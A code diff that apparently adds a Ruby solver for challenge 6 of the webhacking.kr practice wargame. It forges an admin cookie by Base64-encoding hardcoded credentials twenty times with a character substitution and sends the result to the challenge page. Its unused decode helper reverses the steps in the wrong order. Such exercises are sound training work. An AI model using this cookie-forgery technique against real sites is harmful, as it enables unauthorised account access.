@@ -207,6 +207,40 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 6
+  class Challenge6 < ChallengeBase
+    CHALLENGE = 6
+
+    QUERY = '/challenge/web-06/'
+    USER = 'admin'
+    PASSWORD = 'nimda'
+    ROUNDS = 20
+
+    def exec
+      user = encode(USER)
+      password = encode(PASSWORD)
+      log('Sending cookie')
+      response = get(
+        QUERY,
+        { 'Cookie' => "user=#{user}; password=#{password}" }
+      )
+      check(response.body)
+    end
+
+    private
+
+    def encode(data)
+      ROUNDS.times { data = Base64.strict_encode64(data) }
+      data.tr('12345678', '!@$^&*()')
+    end
+
+    def decode(data)
+      ROUNDS.times { data = Base64.strict_decode64(data) }
+      data.tr('!@$^&*()', '12345678')
+    end
+  end
+
+  ##
   # Challenge 19
   class Challenge19 < ChallengeBase
     CHALLENGE = 19
